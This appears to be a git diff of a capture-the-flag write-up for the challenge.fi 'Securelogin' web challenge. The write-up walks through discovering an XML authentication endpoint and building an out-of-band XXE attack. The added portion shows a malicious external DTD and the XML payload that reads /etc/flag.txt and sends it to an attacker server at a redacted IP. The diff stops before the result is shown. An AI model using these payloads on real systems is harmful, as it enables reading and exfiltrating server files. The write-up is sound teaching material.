@@ -43,6 +43,7 @@ We can clearly see that this comment was not removed before moving to production
 The debug information seems to be a HTTP POST request to `xml.php` residing on the server itself. Some data is sent with the request in a field labeled `xml`. The data seems to be url encoded base64 data.
 
 Decoding this data sent in the debug request results in some XML data.
+
 <img src="https://github.com/Sanduuz/CTFWriteUps/blob/master/challenge.fi/Web/Securelogin/attachments/xml_data.png" />
 
 The XML data sent with the request starts with a XML declaration that is used to specify metadata for the parser. This metadata includes xml version and character encoding to be used by the parser.
@@ -54,6 +55,7 @@ So it seems that the `xml.php` file is used for some kind of XML-based authentic
 Time to dig deeper and start experimenting by ourselves.
 
 Let us traverse to the path `/xml.php` on the server to see whether the file still exists after moving to production.
+
 <img src="https://github.com/Sanduuz/CTFWriteUps/blob/master/challenge.fi/Web/Securelogin/attachments/xml.php.png" />
 
 We did not get a 404-error, which means that the file still exists. The response returns an error message stating that username or password was not found. This is because instead of sending a HTTP POST request with the XML data, a HTTP GET request was sent to the server.
@@ -89,6 +91,7 @@ print(request.text)
 ```
 
 Running the script `python3 send_request.py` lets us see the server response when trying to authenticate with `admin:admin` credentials.
+
 <img src="https://github.com/Sanduuz/CTFWriteUps/blob/master/challenge.fi/Web/Securelogin/attachments/creds_not_found.png">
 
 Yet again the same error as previously. 
@@ -98,6 +101,7 @@ The server has to understand the data that we supply in the form of XML. That me
 What if we try to trick the XML parser into crashing? That might give us some extra information that could come in handy. We can do that by changing our XML data in a way that the username and/or password contains illegal characters that would usually throw off the XML parser.
 
 We can check that by using the same script, but this time let's change the credentials from `admin` to ```!@#$%^&*()_+{}><;:'"`\\/```
+
 <img src="https://github.com/Sanduuz/CTFWriteUps/blob/master/challenge.fi/Web/Securelogin/attachments/creds_not_found.png">
 
 Still nothing... 
@@ -237,7 +241,7 @@ Now how would we be able to see the file contents of `/etc/flag.txt` when no dat
 We just need the server to do a simple HTTP GET request passing the file contents as a GET parameter to a webserver that we have access to. Let's try doing just that:
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE Credentials [
+<!DOCTYPE XXE [
 	<!ENTITY % flag SYSTEM "file:///etc/flag.txt">
 	<!ENTITY % XXE "<!ENTITY exfil SYSTEM 'http://[IP REDACTED]/?flag=%flag;'>">
 	%XXE;
@@ -252,14 +256,37 @@ This reads the file contents of `/etc/flag.txt` to a parameter entity `flag`. Th
 This should trigger the server to make a HTTP GET request to our webserver with passing the file contents as a GET parameter.
 
 Let's quickly set up our webserver with `php -S 0.0.0.0:80`
-<img src="https://github.com/Sanduuz/CTFWriteUps/blob/master/challenge.fi/Web/Securelogin/attachments/php-server.png">
+
+<img src="https://github.com/Sanduuz/CTFWriteUps/blob/master/challenge.fi/Web/Securelogin/attachments/php-server.png" width="500">
 
 However, when we send that XML document to the server the same old bland response `Username or password not found! Try Harder!` is sent back and no connection is received on our webserver. Why does this happen?
 
 Well according to the [World Wide Web Consortium's (W3C) recommendation on XML](https://www.w3.org/TR/2006/REC-xml-20060816/REC-xml-20060816.xml): parameter entity references must not occur within markup declarations in the internal DTD subset; However, that does not apply to references that occur in external parameter entities.
+
 <img src="https://github.com/Sanduuz/CTFWriteUps/blob/master/challenge.fi/Web/Securelogin/attachments/xml_specification.png">
 
 Our current exploit indeed does have parameter entity reference within a markup declaration in the internal DTD subset right here:
 `<!ENTITY % XXE "<!ENTITY exfil SYSTEM 'http://[IP REDACTED]/?flag=%flag;'>">`
 
 Luckily this does not affect external parameter entities, so we can just use an external DTD.
+
+Let's start by creating a malicious DTD file that we are going to use:
+```xml
+<!ENTITY % flag SYSTEM "file:///etc/flag.txt">
+<!ENTITY % XXE "<!ENTITY exfil SYSTEM 'http://[IP REDACTED]/?flag=%flag;'>">
+```
+
+Then let's create an XML document that will retrieve our external DTD:
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE XXE [
+	<!ENTITY % dtd SYSTEM "http://[IP REDACTED]/malicious.dtd">
+	%dtd;
+	%XXE;
+]>
+<creds>
+	&exfil;
+</creds>
+```
+
+Now this should surely work.
